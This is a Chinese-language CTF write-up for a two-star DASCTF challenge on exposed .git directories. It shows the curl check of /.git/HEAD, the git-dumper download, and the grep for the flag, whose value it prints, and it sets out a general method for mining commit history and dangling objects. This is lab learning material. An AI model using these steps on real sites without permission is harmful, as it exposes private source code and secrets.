【DASCTF Git测试】平台：dasctf｜难度：☆☆｜日期：2026-08-01

## 考点
.git 泄露（敏感信息泄露专栏）—— 仓库内容 ≠ 线上内容

## 我的思路
1. 页面标题"Git测试" + 提示"小李几次迭代后直接整个文件夹放线上" → .git 泄露
2. 验证 `/.git/HEAD` 返回 `ref: refs/heads/master` → 实锤
3. git-dumper 下载整个仓库
4. 检查仓库文件 → index.html 里有 flag（**线上 index.html 没有**！）

flag：`n1book{git_looks_s0_easyfun}`

## 解题过程
```bash
# 1. 验证 .git 存在
curl -s <靶机>/.git/HEAD
# → ref: refs/heads/master

# 2. 下载整个仓库
python -m git_dumper <靶机>/.git/ 本地目录

# 3. 找 flag（当前版本就有，连 git log 都不用）
Select-String -Path 本地目录/index.html -Pattern "flag"
# → <p>n1book{git_looks_s0_easyfun}</p>
```

## 收获
### 1. 核心认知：仓库 ≠ 线上
- 开发者把 git 仓库直接部署到线上 = 泄露一切**未部署的内容**
- 线上 index.html 没有 flag，仓库里的 index.html 有 → **flag 只在 .git 里**
- 所以这题必须下载仓库，光看页面没用

### 2. .git 泄露的利用流程（标准三步）
```
① 验证：/.git/HEAD 返回 ref: xxx → 存在
② 下载：git-dumper 抓取全部对象（git 对象是 zlib 压缩、散列命名，手抓很麻烦）
③ 分析：当前文件 → git log/git show 翻历史 → git fsck 找悬空对象
```

### 3. 找 flag 的优先级（git 题）
```
① 仓库里的当前文件（grep flag）—— 最常中
② git log --all --oneline 看提交历史 → git show 每个提交
③ git fsck --lost-found 找被删除的悬空提交
```

### 4. 工具
- git-dumper：`pip install git-dumper`（一次性安装，本地永久用）
- 自动化：sensitive_scan.py / combine_scan.py 发现 .git 后自动下载搜索

## 常见坑
- 有的 .git 题 flag 在历史提交/悬空对象里，当前版本没有 → 别只看当前文件
- 线上页面内容 ≠ 仓库内容，页面没 flag 不代表仓库没有
